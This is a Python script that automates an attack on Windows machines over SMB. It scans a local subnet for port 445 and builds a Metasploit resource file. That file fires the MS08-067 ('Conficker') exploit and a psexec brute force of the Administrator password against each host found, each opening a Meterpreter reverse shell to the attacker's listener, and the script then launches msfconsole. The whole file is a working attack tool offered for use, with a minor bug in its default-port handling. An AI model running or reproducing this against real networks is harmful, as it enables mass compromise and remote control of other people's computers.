#!/usr/bin/env python
import os
import optparse
import nmap 

def setupHandler(configFile, lhost, lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set PAYLOAD '+\
	'windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('exploit -j -z\n')
	configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
	configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST ' + str(tgtHost) + '\n')
	configFile.write('set PAYLOAD '+\
	'windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('exploit -j -z\n')

def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	username = 'Administrator'
	pF = open(passwdFile, 'r')
	for password in pF.readlines():
		password = password.strip('\n').strip('\r')
		configFile.write('use exploit/windows/smb/psexec\n')
		configFile.write('set SMBUser ' + str(username) + '\n')
		configFile.write('set SMBPass ' + str(password) + '\n')
		configFile.write('set RHOST ' + str(tgtHost) + '\n')
		configFile.write('set PAYLOAD '+\
		'windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT ' + str(lport) + '\n')
		configFile.write('set LHOST ' + lhost + '\n')
		configFile.write('exploit -j -z\n')


def findTarget(subNet):
	nm = nmap.PortScanner()
	nm.scan(subNet, '445')
	tgtHosts =[]
	for host in nm.all_hosts():
		if nm[host].has_tcp(445):
			state = nm[host]['tcp'][445]['state']
			if state == 'open':
				print '[+] Found Target Host: '+host
				tgtHosts.append(str(host))

	return tgtHosts

def main():
	configFile = open('meta.rc', 'w')
	parser = optparse.OptionParser('[-] Usage Smb_Hack '+\
		'-H <RHOST> -l <LHOST> [-p <LPORT> -F <Password File>]')
	parser.add_option('-H', dest='tgtHost', type='string', \
		help='specify the target address')
	parser.add_option('-p', dest='lport', type='string', \
		help='specify the listen port')
	parser.add_option('-l', dest='lhost', type='string', \
		help='specify the listen address')
	parser.add_option('-F', dest='passwdFile', type='string',\
		help='password file for SMB brute force attempt')
	(options, args) = parser.parse_args()
	if(options.tgtHost == None) | (options.lhost == None):
		print parser.usage
		exit(0)

	lhost = options.lhost
	lport = options.lport
	if lport == None:
		lport == '1337'
	print 'Wait... Searching the Network!!!'
	passwdFile = options.passwdFile
	tgtHosts = findTarget(lhost+'/24')
	print 'Launching Exploit...'
	setupHandler(configFile, lhost, lport)
	for tgtHost in tgtHosts:
		confickerExploit(configFile, tgtHost, lhost, lport)
		if passwdFile != None:
			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
	configFile.close()
	os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
	main()